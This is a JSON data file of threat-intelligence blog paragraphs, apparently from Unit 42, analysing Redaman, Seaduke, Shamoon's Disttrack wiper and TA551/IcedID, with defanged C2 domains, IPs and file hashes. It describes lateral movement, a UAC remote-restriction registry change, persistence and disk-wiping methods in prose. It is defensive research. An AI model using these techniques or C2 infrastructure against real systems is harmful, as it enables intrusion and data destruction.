            "content": [
                "azureedge[.]today"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "nsatc[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Akamai[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "t-msedge[.]world"
            ]
        }
    ],
    "381152d51e4ef6985e89ecc17d9e080a9f47054a": [
        {
            "type": "paragraph",
            "content": [
                "Redaman is banking malware first noted in 2015 that targets recipients who conduct transactions using Russian financial institutions.",
                "First reported as the RTM banking Trojan, vendors like Symantec and Microsoft described an updated version of this malware as Redaman in 2017.",
                "We have found versions of Redaman in Russian language mass-distribution campaigns during the last four months of 2018.",
                "This blog tracks recent developments from an ongoing campaign of malicious spam (malspam) currently distributing this banking malware from September through December of 2018.",
                "We cover the following areas:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since September of 2018, Redaman banking malware has been distributed through malspam.",
                "In this campaign, the Russian language malspam is addressed to Russian email recipients, often with email addresses ending in .ru.",
                "These emails have file attachments.",
                "These file attachments are archived Windows executable files disguised as a PDF document.",
                "In September 2018, the attachments were zip archives.",
                "In October 2018, the attachments were zip archives, 7-zip archives, and rar archives.",
                "In November 2018, the attachments were rar archives.",
                "And in December 2018, the attachments changed to gzip archives with file names ending in .gz."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1: Flow chart for infections from Redaman banking malware from September through December of 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Subject lines, message text, and attachment names constantly change for this malspam.",
                "But the messages all have a common theme: they refer to a document or file for an alleged financial issue the recipient needs to resolve.",
                "These messages are often vague, and they contain few details on the alleged financial issue.",
                "Their only goal is to trick the recipient into opening the attached archive and double-clicking the executable contained within."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Among dozens of examples seen from September through December of 2018, here is a selection of 10 subject lines from this malspam:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following are Google translations for the above subject lines:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2: Example of Redaman malspam from September 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3: Example of Redaman malspam from October 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4: Example of Redaman malspam from November 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5: Example of Redaman malspam from December 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The content of these emails and data from our AutoFocus threat intelligence platform confirms this campaign is primarily targeting Russian recipients.",
                "We found 3,845 email sessions in AutoFocus with attachments tagged as Redaman banking malware from September through December 2018.",
                "Data on the top 10 senders and recipients of this malspam follow:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mail servers of the top 10 senders:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mail servers of the top 10 recipients:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6: AutoFocus map visualization for distribution of email recipients, September through December of 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We analyzed a sample of Redaman malware from malspam on November 13th, 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 hash of rar archive from the malspam:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 hash of Redaman executable extracted from the rar archive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 hash of Redaman DLL created by the above executable:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the Windows executable for Redaman is first run, it checks for the following files or directories on the local host (C:\\ or D:\\ drives):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If any of the above files or directories exist, the Windows executable throws an exception and exits.",
                "This indicates Redaman checks if it is running in a sandbox or similar type of analysis environment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If no exceptions occur, the Windows executable drops a DLL file in the user's AppData\\Local\\Temp\\ directory, creates a randomly-named folder under C:\\ProgramData\\ directory and moves the DLL under that folder as a random file name.",
                "This Redaman DLL is made persistent through a scheduled Windows task with the following properties:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After creating a scheduled task and causing the DLL to load, the initial Redaman executable file deletes itself."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7: Example of a Redaman DLL persistent through a scheduled task."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8: Process Hacker showing the Redaman DLL active using rundll32.exe."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Redaman uses an application-defined hook procedure to monitor browser activity, specifically Chrome, Firefox, and Internet Explorer.",
                "It then searches the local host for information related to the financial sector.",
                "Other capabilities of Redaman include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We generated the following infection traffic using the executable with SHA256 hash cd961e81366c8d9756799ec8df14edaac5e3ae4432c3dbf8e3dd390e90c3e22f on November 14th, 2018:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9: Redaman infection traffic filtered in Wireshark."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Network activity started with an HTTPS URL to namecha[.]in, which is an alternative namecoin block explorer.",
                "Namecoin is a cryptocurrency system that can be used for decentralized DNS.",
                "That proves to be the case here, since the URL returned an IP address used for subsequent post-infection traffic as shown in Figure 10."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10: Data returned from namecha[.]in used for subsequent infection traffic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During the infection, callback traffic was periodically sent to a command and control (C2) sever at 185.141.61[.]246.",
                "Shortly after the infection, return traffic from the C2 server sent a Pony variant DLL to the infected Windows client."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11: Using Wireshark to find 58 kB of encoded data returned from the C2 server at 185.141.61[.]246."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Data for the Pony variant DLL was XOR encoded with multiple XOR keys and RTLcompressed.",
                "The SHA256 of this Pony variant DLL is b4701d95219d465e978c4a815fcce89787916da33ae2a49d0e76d4445fd39ada, and it generated traffic to 193.37.213[.]28/p/g_3453456jawd346.php during the infection."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since it was first noted in 2015, this family of banking malware continues targeting recipients who conduct transactions with Russian financial institutions.",
                "We found over 100 examples of malspam during the last four months of 2018, and this blog provides a closer look at Redaman during that timeframe.",
                "We covered the following areas:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We expect to discover new Redaman samples as 2019 progresses."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat.",
                "Traps identifies these files through Local Analysis and Wildfire has classified them as malicious.",
                "Our threat prevention platform detects this malware, and see the below appendices below for details on Redaman malware we discovered from September through December of 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 file hashes for 119 malspam attachments, 30 extracted Redaman executable files, and 30 dropped Redaman DLL files found from September through December 2018.",
                "Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-09-thru-2018-12-file-hashes-for-Redaman-banking-malware.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in September 2018.",
                "Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-09-file-hashes-for-Redaman-banking-malware.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in October 2018.",
                "Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-10-file-hashes-for-Redaman-banking-malware.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in November 2018.",
                "Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-11-file-hashes-for-Redaman-banking-malware.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 file hashes, archive file names, and extracted file names for Redaman banking malware found in December 2018.",
                "Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-12-file-hashes-for-Redaman-banking-malware.txt"
            ]
        }
    ],
    "97430d112819a2c6120ac18265fe414cfb68d99f": [
        {
            "type": "paragraph",
            "content": [
                "Earlier this week Symantec released a blog post detailing a new Trojan used by the Duke family of malware.",
                "Within this blog post, a payload containing a function named forkmeiamfamous was mentioned.",
                "While performing some research online, Unit 42 was able to identify the following sample, which is being labeled as Trojan.Win32.Seadask by a number of anti-virus companies."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our analysis has turned up more technical details and indicators on the malware itself that arent mentioned in Symantecs post.",
                "Here are some of our observations:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the UPX packer is removed from the malware sample, it becomes quickly apparent that were dealing with a sample compiled using PyInstaller.",
                "This program allows an individual to write a program using the Python scripting language and convert it into an executable for the Microsoft Windows, Linux, Mac OSX, Solaris, or AIX platform.",
                "The following subset of strings that were found within the UPX-unpacked binary confirms our suspicions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because the sample was written in Python originally, were able to extract the underlying code.",
                "A tool such as PyInstaller Extractor can be used to extract the underlying pyc files present within the binary."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.Extracted Python files from Seaduke"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We can then use a tool such as uncompyle2 to convert the Python byte-code into the original source code.",
                "Once this process is completed, we quickly realize that the underlying Python code has been obfuscated."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2.Obfuscated Python code"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Tracing through the obfuscated code, we identify an exec(ZxkBDKLakV) statement, which will presumably execute some Python code.",
                "Tracing further, we discover that this string is generated via appending a number of strings to the ZxkBDKLakV variable.",
                "Finally, we find that after this string is created, it is base64-decoded and subsequently decompressed using the ZLIB library."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3.Second layer of obfuscation identified"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following simple Python code can be used to circumvent this layer of obfuscation:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remaining Python code still appears to be obfuscated, however, overall functionality can be identified."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see below, almost all variable names and class names have been obfuscated using long unique strings."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4.Obfuscation discovered in final payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using a little brainpower and search/replace, we can begin identifying and renaming functionality within the malware.",
                "A cleaned up copy of this code can be found on GitHub.",
                "One of the first things we notice is a large blob of base64-encoded data, which is additionally decompressed using ZLIB.",
                "Once we decode and decompress this data, we are rewarded with a JSON object containing configuration data for this malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.Base64-encoded / ZLIB compressed data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This configuration object provides a number of clues and indicators about the malware itself.",
                "After this data is identified, we begin tracing execution of the malware from the beginning.",
                "When the malware is initially run, it will determine on which operating system it is running.",
                "Should it be running on a non-Windows system, we see a call to the infamous forkmeiamfamous method.",
                "This method is responsible for configuring a number of Unix-specific settings, and forking the process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6.Main execution of malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Continuing along, we discover that this malware has the ability to persist using one of the following techniques:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware copies itself to a file name referenced in the JSON configuration."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7.Persistence techniques"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the malware installs itself, it begins making network requests.",
                "All network communications are performed over HTTP for this particular sample; however, it appears to support HTTPS as well.",
                "When the malware makes the initial outbound connection, a specific Cookie value is used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8.Initial HTTP request made"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In actuality, this Cookie value contains encrypted data.",
                "The base64-encoded data is parsed from the Cookie value (padding is added as necessary)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EBJhZTlKiqN8nYWejKh7UpDycPlcrGMEcTE="
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting decoded data is shown below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\x10\\x12ae9J\\x8a\\xa3|\\x9d\\x85\\x9e\\x8c\\xa8{R\\x90\\xf2p\\xf9\\\\\\xacc\\x04q1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The underlying data has the following characteristics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9.Cookie data structure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "XORing the first single character against the second character identifies the length of the random string.",
                "Using the above example, we get the following."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First Character : '\\x10'\nSecond Character : '\\x12'\nString Length (16 ^ 18) :",
                "2\nRandom String : 'ae'\nEncrypted Data : '9J\\x8a\\xa3|\\x9d\\x85\\x9e\\x8c\\xa8{R\\x90\\xf2p\\xf9\\\\\\xacc\\x04q1'"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the encrypted data is encrypted using the RC4 algorithm.",
                "The key is generated by concatenating the previously used random string with the new one, and taking the SHA1 hash of this data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This same key is used to decrypt any response data provided by the server.",
                "The server attempts to mimic a HTML page and provides base64-encoded data within the response, as shown below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10.Server response"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Data found within tags in the HTML response is joined together and the white space is removed.",
                "This data is then base64-decoded with additional characters (-_) prior to being decrypted via RC4 using the previously discussed key.",
                "After decryption occurs, the previous random string used in key generation is updated with the random string.",
                "In doing so, the attackers have ensured that no individual HTTP session can be decrypted without seeing the previous session.",
                "If the decrypted data does not produce proper JSON data, Seaduke will discard it and enter a sleep cycle."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Otherwise, this JSON data will be parsed for commands.",
                "The following commands have been identified in Seaduke."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order for the self_exit or seppuku commands to properly execute, the attackers must supply a secondary argument of YESIAMSURE."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Overall, Seaduke is quite sophisticated.",
                "While written in Python, the malware employs a number of interesting techniques for encrypting data over the network and persisting on the victim machine.",
                "WildFire customers are protected against this threat.",
                "Additionally, Palo Alto Networks properly categorizes the URL used by Seaduke as malicious."
            ]
        }
    ],
    "925cb3a9c48349176182d734241397da51636fe8": [
        {
            "type": "paragraph",
            "content": [
                "In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack.",
                "Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials.",
                "More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable.",
                "The attack four years ago resulted in 30,000 or more systems being damaged."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Last week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign.",
                "The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks.",
                "It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45.",
                "In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.",
                "The 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Disttrack is comprised of three distinct parts: the dropper, communications and wiper components.",
                "The main Disttrack executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them.",
                "Embedded within each Disttrack sample is a component responsible for communicating with a C2 server and a separate component used to carry out the wiping functionality."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper extracts the communications and wiper components from resources named \"PKCS7\" and \"PKCS12\" respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named X509.",
                "To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key.",
                "The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource.",
                "When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample's configuration as an additional layer of obfuscation.",
                "Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Resources containing Disttrack components"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Disttrack is mainly focused on data destruction and attempting to damage as many systems as possible.",
                "To do so, this malware attempts to spread to other systems on network using what are likely stolen administrator credentials.",
                "This is again similar to the 2012 Shamoon attacks, where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation.",
                "Disttrack also has the ability to download and execute additional applications to the system, as well as remotely set the date to start wiping systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Disttrack malware spreads to other systems automatically using stolen credentials.",
                "The Disttrack we analyzed contained the internal domain names and administrator credentials associated with the targeted organization.",
                "The internal domain and credentials appear to be stolen prior to the creation of this tool, as it is not a public domain and the credentials are not weak enough to have obtained through guessing, brute force or dictionary attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Disttrack uses the internal domain names and credentials to log into remote systems on the same network segment.",
                "The malware determines the local network segment associated with the target system (call to gethostname) by obtaining the IP address for the system (call to gethostbyname).",
                "It then uses the system's IP addresses to enumerate the /24 network (x.x.x.0-255) that the system is networked with, and will attempt to spread to each of these remote systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service, which it will connect to using RegConnectRegistryW.",
                "Once connected, the dropper attempts to disable UAC (User Access Control) remote restrictions by setting the following registry key to a value of \"1\":"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After disabling UAC, the dropper connects to the remote system (using NetUseAdd) and logs in using the embedded stolen credentials.",
                "The dropper then checks to see if it has administrator privileges on the remote system by attempting to open \"\\system32\\csrss.exe\", which allows it to determine if it can write its payload to the \"\\system32\" folder on the remote system.",
                "The dropper then has two different methods in which it can pivot to the remote system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first method involves the dropper writing itself to \"\\system32\\ntssrvr32.exe\" on the remote system.",
                "After writing itself to the remote system, the dropper creates a service named \"ntssrv\", with a display name of \"Microsoft Network Realtime Inspection Service\" and a description of \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols\" to execute the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The second, alternative method also involves the dropper copying itself to \"\\system32\\ntssrvr32.exe\" on the remote system; however, instead of creating a remote service, this method calls the NetScheduleJobAdd function within the Windows netapi32 library to create a scheduled task to run the payload.",
                "Scheduled tasks require a time in which the task will run, which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system.",
                "The dropper then adds 90 seconds to the time of day value on the remote system and uses this value as the \"JobTime\" to run the task in three minutes, which executes the payload on the remote system.",
                "The following pseudo-code shows the scheduled task creation process:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Disttrack extracts the communication component from its resource named PKCS7, decrypts it and saves the resulting cleartext to the file %WINDOWS%\\system32\\netinit.exe."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The communication module interacts with its C2 server using HTTP requests.",
                "The communications modules in both the x86 and x64 variants of Disttrack we analyzed were configured to use 1.1.1.1:8080 for its C2 server, which does not host an operational Disttrack C2 server.",
                "The lack of an operational C2 server suggests that the threat actors did not desire remote access to infected systems, rather the actors sought to render them unusable instead.",
                "If the modules were configured with an operational C2 server, the module would generate an HTTP GET request that resembles the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The interesting part of the request above is that the host \"server\", the URL \"category/page.php\", the parameter \"shinu\" and the user-agent \"Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)\" are hardcoded into the tool.",
                "The data in \"shinu\" parameter is a combination of the system's tickcount, local IP address, operating system version, keyboard layout and the contents of %WINDOWS%\\inf\\netimm173.pnf.",
                "The C2 server can respond to this HTTP request with one of the following two commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We believe the HTTP host value of \"server\" and the non-operational \"1.1.1.1\" C2 address may suggest that the communication module is created with a builder tool, which in this case the actor mistakenly or purposefully did not provide an active C2 server when building this module.",
                "While completely speculative, the word shinu used as a parameter could be a reference to the Arabic slang for the word what, as well as a reference to a village name in northwestern Iran."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Disttrack dropper is responsible for installing the wiper component of this Trojan, however, it will only activate this component if the system time is greater than a preset date.",
                "The dropper obtains a date used to activate the wiping functionality by reading a specific file, or using a hardcoded timestamp of \"2016/11/17 20:45\".",
                "The file containing this timestamp is named \"\\inf\\usbvideo324.pnf\", which is not initially installed but is provided by the C2 server if it sends the communications module the \"T\" command.",
                "The \"usbvideo324.pnf\" file would have the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BYTE year;\nBYTE month;\nBYTE day;\nBYTE hour;\nBYTE year;\nBYTE minute;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the dropper determines the system date is larger than the specified date, the dropper will extract the wiper component from a resource named \"PKCS12\" and save it to the \"system32\" folder with one of the following filenames appended with a \".exe\" extension:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper then runs the wiper component with a command line argument of \"1\".",
                "The wiper component extracts a driver from its resource section and decrypts it with a 226 byte XOR key.",
                "The wiper saves the extracted driver to \"C:\\Windows\\System32\\Drivers\\drdisk.sys\" and installs the kernel driver by creating a service named \"drdisk\" with the following command line commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation, which provides direct access to files, disks and partitions.",
                "It appears that the drdisk.sys driver (SHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6) is the exact same driver as used in the Shamoon attack in 2012.",
                "With the kernel driver installed, the wiper can begin writing to protected system locations, such as the master boot record (MBR) and partition tables of storage volumes.",
                "The wiper can be configured to overwrite files in three different ways, specified by a configuration setting of \"F\", \"R\" or \"E\".",
                "If configured with the \"F\" setting, the wiper loads a resource named AJKEOA, which extracts a JPEG image to use to overwrite files and partition tables.",
                "If the wiper is configured with the \"E\" setting, the wiper will encrypt the contents of the file using a random value as a key and the RC4 algorithm.",
                "If configured with the \"R\" setting, the wiper will overwrite files with the random values that would be used as a key in \"E\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample we analyzed was configured with \"F\", meaning it would overwrite files with an image obtained from its resource section.",
                "The image extracted is a picture of a Syrian boy named Alan Kurdi, whose drowning on September 2, 2015 received international attention in regards to the ongoing Syrian refugee crisis.",
                "The previous Shamoon attack in 2012 used an image of a burning American flag, continuing the political image theme."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From a functionality standpoint, the wiper relies on EldoS' RawDisk driver to overwrite files on the system.",
                "During this activity, we noticed the wiper changing the system time to August 2012, as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August, which is when the temporary license would expire.",
                "This modification to the system time was seen in the previous campaign, and the temporary license key within the wiper component is the exact same as wiper component from the 2012 attacks.",
                "The wiper itself queries the following registry keys to obtain a list of partitions to overwrite:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to these partitions, the wiper attempts to overwrite files and subfolders within in the following folders:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After overwriting these files and the partition tables, the wiper issues the following command to restart the system:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The arguments and switches used in the shutdown command above forces all running applications to close and causes the system to reboot (-r) after 2 seconds (-t 2).",
                "This command does result in a dialog prompt, seen in Figure 1, that informs the user that the system is shutting down."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Dialog prompt displayed when the Wiper component runs the 'shutdown' command"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the partition tables overwritten, the system will no longer be able to properly boot, which renders the system unusable.",
                "During analysis, our analysis system was rendered unusable, as the virtual machine was unable to find the operating system during boot up, as seen in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Analysis virtual machine unable to boot after executing Disttrack Wiper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization in Saudi Arabia.",
                "The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective.",
                "Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key)..",
                "The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable.",
                "To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from Disttrack:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Disttrack Droppers"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 (x64)\n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n(x86)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Communication Components"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5 (x64)\n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842 (x86)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Wiper Components"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a (x64)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd (x86)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EldoS RawDisk Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a (x64)\n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6 (x86)"
            ]
        }
    ],
    "496826ee3c7aa6b9867a76c487eeb82be4b5c3a5": [
        {
            "type": "paragraph",
            "content": [
                "TA551 (also known as Shathak) is an email-based malware distribution campaign that often targets English-speaking victims.",
                "The campaign discussed in this blog has targeted German, Italian and Japanese speakers.",
                "TA551 has historically pushed different families of information-stealing malware like Ursnif and Valak.",
                "After mid-July 2020, this campaign has exclusively pushed IcedID malware, another information stealer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog provides an overview of TA551, as well as previous activity from this campaign.",
                "We also examine changes from this campaign since our previous blog about TA551 pushing Valak in July 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Next-Generation Firewall customers are protected from this threat with the Threat Prevention security subscription, which detects the malware.",
                "AutoFocus customers can track this activity using the TA551 and IcedID tags."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From mid-July through November 2020, TA551 has remained consistent in its infection process.",
                "A flow chart for the chain of events is shown in Figure 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial lure is an email spoofing an email chain.",
                "These email chains are retrieved from email clients on previously infected hosts.",
                "The message has an attached ZIP archive and a message informing the user of a password necessary to open the attachment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After opening the ZIP archive, the victim finds a Microsoft Word document with macros.",
                "If the victim enables macros on a vulnerable Windows computer, the victims host retrieves an installer DLL for IcedID malware.",
                "This will infect a vulnerable Windows computer.",
                "See FIgures 2-7 for a recent example targeting a Japanese-speaking victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have a GitHub repository where we track recent TA551 activity.",
                "The repository contains information on each wave of attack from TA551 since July 6, 2020.",
                "Starting on July 14, 2020, we have only seen IcedID malware from these waves of attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since July 14, 2020, these waves of malspam consistently targeted English-speaking victims until Oct. 27, 2020, when we started seeing Japanese templates for the Word documents.",
                "TA551 consistently targeted Japanese-speaking victims from Oct. 27-Nov. 20, 2020.",
                "After approximately three weeks of Japanese-focused attacks, TA551 switched back to English-speaking victims starting on Nov. 24, 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Regardless of the targeted group, TA551 continues to push IcedID as its malware payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have traced TA551 as far back as February 2019, and since that time, we have noted the following characteristics:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8 shows the earliest email we can confirm from this campaign, dated Feb. 4, 2019.",
                "It targeted an English-speaking recipient and pushed Ursnif malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "File description: Example of Windows EXE retrieved by Word macro  an installer for Ursnif"
            ]
        },
        {
            "type": "paragraph",
            "content": [
